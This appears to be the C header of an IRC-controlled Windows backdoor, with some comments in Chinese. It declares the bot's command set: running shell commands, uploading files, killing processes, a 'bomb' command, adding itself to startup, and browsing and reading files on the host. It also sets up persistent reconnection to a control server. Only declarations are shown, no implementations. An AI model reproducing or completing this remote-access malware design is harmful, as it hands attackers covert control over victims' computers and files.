
#ifndef HEADER
#define HEADER


#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>       // Socket connection
#include <windows.h>        // WinAPI calls
#include <ws2tcpip.h>       // TCP-IP Sockets
#include <stdio.h>
#include <string.h>

#include <wincrypt.h>
#include <malloc.h>

#pragma comment(lib, "Ws2_32.lib")

// Constants
#define DEFAULT_BUFLEN 4096
#define MAX_SEND_LENGTH 400  // 最大发送长度（接近但不超过IRC限制）
#define SEND_INTERVAL 500    // 发送间隔（毫秒）
#define MAX_RECONNECT_ATTEMPTS 999
#define RECONNECT_INTERVAL 5000 // 单位：毫秒
#define LONG_SLEEP_INTERVAL 1000*60*60*1 // 1小时


typedef enum
{
    CMD_UNKNOWN,
    CMD_EXECUTE,
    CMD_GETHOSTNAME,
    CMD_GETUPTIME,
    CMD_SETSTARTUP,
    CMD_FILE_UPLOAD,
    CMD_KILL_PROCESS,
    CMD_BOMB,
    CMD_LS,
    CMD_RUN,
    CMD_PWD,
    CMD_CD,
    CMD_CAT,
}CommandType;
typedef struct
{
    CommandType type;
    char* params[10]; // 最多支持 10 个参数
    int num_params;
} ParsedCommand;

// 消息缓冲区结构
typedef struct {
    char buffer[DEFAULT_BUFLEN];  // 消息缓冲区
    size_t length;                // 当前缓冲区长度
    char target[128];             // 目标接收者
    time_t lastSendTime;          // 上次发送时间
} MessageBuffer;




//function.cpp
BYTE* base64_decode(const char* input, DWORD in_len, DWORD* out_len);
int handle_file_upload(ParsedCommand cmd);
int run_executable(const char* path);
char* list_directory(const char* path);
char* pwd_command();
char* cd_command(const char* path);
char* cat_file(const char* path);

char* ExecuteCommand(const char* command);
void set_startup(const char* program_path, int enable);


//read_command.cpp
ParsedCommand parsecommand(char* raw_command);
char* execute_parsed_command(ParsedCommand cmd, SOCKET tcpsock);

//network.cpp
SOCKET TCPhandler(const char* server, const char* baseNick);


//message.c


void flushBuffer(MessageBuffer* mb, SOCKET sock);
void initMessageBuffer(MessageBuffer* mb, const char* target);
void appendToBuffer(MessageBuffer* mb, SOCKET sock, const char* message);

  
#endif